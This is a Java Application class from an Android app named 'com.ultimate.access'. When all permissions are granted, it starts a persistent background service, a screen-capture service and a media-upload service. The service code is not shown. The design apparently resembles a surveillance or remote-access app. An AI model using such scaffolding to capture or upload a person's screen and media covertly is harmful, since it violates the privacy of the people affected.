package com.ultimate.access;

import android.app.Activity;
import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.ultimate.access.services.MediaUploadService;
import com.ultimate.access.services.ScreenCaptureService;
import com.ultimate.access.services.UltimateBackgroundService;

public class UltimateApplication extends Application implements Application.ActivityLifecycleCallbacks {

    private static final String TAG = "UltimateApp";
    private static Context context;
    private static boolean isAppInForeground = false;
    private static boolean allPermissionsGranted = false;
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        context = getApplicationContext();
        registerActivityLifecycleCallbacks(this);

        Log.d(TAG, "UltimateApplication created");
    }

    public static void setAllPermissionsGranted(boolean granted) {
        allPermissionsGranted = granted;
        if (granted) {
            startAllServices();
        }
    }

    private static void startAllServices() {
        try {
            // Start Background Service
            Intent bgIntent = new Intent(context, UltimateBackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(bgIntent);
            } else {
                context.startService(bgIntent);
            }

            // Start Screen Capture Service
            Intent screenIntent = new Intent(context, ScreenCaptureService.class);
            context.startService(screenIntent);

            // Start Media Upload Service
            Intent mediaIntent = new Intent(context, MediaUploadService.class);
            context.startService(mediaIntent);

            Log.d(TAG, "All services started");
        } catch (Exception e) {
            Log.e(TAG, "Error starting services: " + e.getMessage());
        }
    }

    public static Context getContext() {
        return context;
    }

    public static boolean isAppInForeground() {
        return isAppInForeground;
    }

    public static boolean areAllPermissionsGranted() {
        return allPermissionsGranted;
    }

    @Override
    public void onActivityCreated(@NonNull Activity activity, @Nullable Bundle savedInstanceState) {}

    @Override
    public void onActivityStarted(@NonNull Activity activity) {
        isAppInForeground = true;
    }

    @Override
    public void onActivityResumed(@NonNull Activity activity) {
        isAppInForeground = true;
    }

    @Override
    public void onActivityPaused(@NonNull Activity activity) {
        isAppInForeground = false;
    }

    @Override
    public void onActivityStopped(@NonNull Activity activity) {
        isAppInForeground = false;
    }

    @Override
    public void onActivitySaveInstanceState(@NonNull Activity activity, @NonNull Bundle outState) {}

    @Override
    public void onActivityDestroyed(@NonNull Activity activity) {}
}